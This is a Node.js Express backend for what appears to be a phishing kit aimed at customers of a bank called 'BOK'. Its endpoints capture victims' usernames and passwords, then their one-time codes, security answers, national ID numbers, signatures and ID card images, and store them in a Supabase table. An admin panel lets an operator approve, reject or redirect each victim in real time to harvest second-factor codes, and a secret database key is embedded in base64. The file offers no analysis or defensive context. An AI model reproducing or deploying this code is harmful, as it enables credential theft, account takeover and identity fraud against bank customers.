const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '20mb' }));
app.set('trust proxy', true);

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://reayhwohrqtoovzsppfb.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || Buffer.from('c2Jfc2VjcmV0X1ZKWjdxRzhjUExpSWJwUHNLU1YzU2dfMDlGUkpId2o=','base64').toString();
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '356cbcba6e8481c7cbb712fca92e6905dc5459e9cf80077ed6cc4ee8774ba4fa';
const ADMIN_TOKEN = crypto.createHash('sha256').update('token:' + ADMIN_PASSWORD_HASH).digest('hex');

function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
  return false;
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.ip || '';
}

const visitors = new Map();
const VISITOR_TIMEOUT = 15000;

app.post('/api/heartbeat', (req, res) => {
  const vid = String(req.body.vid || '');
  const page = String(req.body.page || 'unknown');
  if (!vid) return res.json({ ok: false });
  visitors.set(vid, { page, ts: Date.now() });
  res.json({ ok: true });
});

app.get('/api/admin/visitors', (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
  const now = Date.now();
  let count = 0;
  const pages = [];
  visitors.forEach((v, id) => {
    if (now - v.ts < VISITOR_TIMEOUT) { count++; pages.push(v.page); }
    else visitors.delete(id);
  });
  res.json({ ok: true, count, pages });
});

app.post('/api/submit', async (req, res) => {
  try {
    const b = req.body;
    const username = String(b.username || '').trim();
    const password = String(b.password || '').trim();
    if (!username || !password) return res.status(400).json({ error: 'missing data' });
    const id = crypto.randomBytes(6).toString('hex');
    const ip = getClientIp(req);
    const { error } = await supabase.from('bok_logins').insert({
      id, username, password, ip,
      status: 'pending', step: 'login', code: '',
      time: new Date().toISOString()
    });
    if (error) throw error;
    console.log('[SUBMIT] id:', id, 'user:', username);
    res.json({ ok: true, id });
  } catch (err) {
    console.error('[SUBMIT FAIL]', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/submit-code/:id', async (req, res) => {
  try {
    const code = String(req.body.code || '').trim();
    const { error } = await supabase.from('bok_logins').update({
      code, step: 'code', status: 'pending',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/submit-security/:id', async (req, res) => {
  try {
    const question = String(req.body.question || '').trim();
    const answer = String(req.body.answer || '').trim();
    const { error } = await supabase.from('bok_logins').update({
      security_question: question, security_answer: answer,
      step: 'security', status: 'pending',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/submit-update/:id', async (req, res) => {
  try {
    const b = req.body;
    const updateData = JSON.stringify({
      full_name: String(b.full_name || ''), id_number: String(b.id_number || ''),
      birth_date: String(b.birth_date || ''), phone: String(b.phone || ''),
      email: String(b.email || ''), signature: String(b.signature || ''),
      id_front: String(b.id_front || ''), id_back: String(b.id_back || '')
    });
    const { error } = await supabase.from('bok_logins').update({
      update_data: updateData, step: 'update-data', status: 'pending',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/status/:id', async (req, res) => {
  try {
    const { data } = await supabase.from('bok_logins').select('status,step,redirect_to,security_question').eq('id', req.params.id).maybeSingle();
    if (!data) return res.status(404).json({ error: 'not found' });
    res.json({ status: data.status, step: data.step, redirect: data.redirect_to || '', security_question: data.security_question || '' });
  } catch (err) {
    res.json({ status: 'pending', step: 'login' });
  }
});

app.post('/api/admin/login', (req, res) => {
  const inputHash = crypto.createHash('sha256').update(req.body.password || '').digest('hex');
  if (inputHash === ADMIN_PASSWORD_HASH) return res.json({ token: ADMIN_TOKEN });
  res.status(401).json({ error: 'wrong password' });
});

app.get('/api/admin/submissions', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const { data, error } = await supabase.from('bok_logins').select('*').order('time', { ascending: false });
    if (error) throw error;
    res.json({ submissions: data || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/accept/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const { error } = await supabase.from('bok_logins').update({
      status: 'accepted', updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/reject/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const { error } = await supabase.from('bok_logins').update({
      status: 'rejected', updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/redirect/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const page = String(req.body.page || '');
    const { error } = await supabase.from('bok_logins').update({
      redirect_to: page, status: 'redirect',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/send-question/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const question = String(req.body.question || '').trim();
    if (!question) return res.status(400).json({ error: 'question required' });
    const { error } = await supabase.from('bok_logins').update({
      security_question: question, security_answer: '',
      redirect_to: 'security', status: 'redirect',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/clear', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    const { data } = await supabase.from('bok_logins').select('id');
    if (data && data.length) await supabase.from('bok_logins').delete().in('id', data.map(r => r.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/admin/delete/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'unauthorized' });
    await supabase.from('bok_logins').delete().eq('id', req.params.id);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.use(express.static(path.join(__dirname, '.')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => console.log('BOK running on port ' + PORT));
}

module.exports = app;
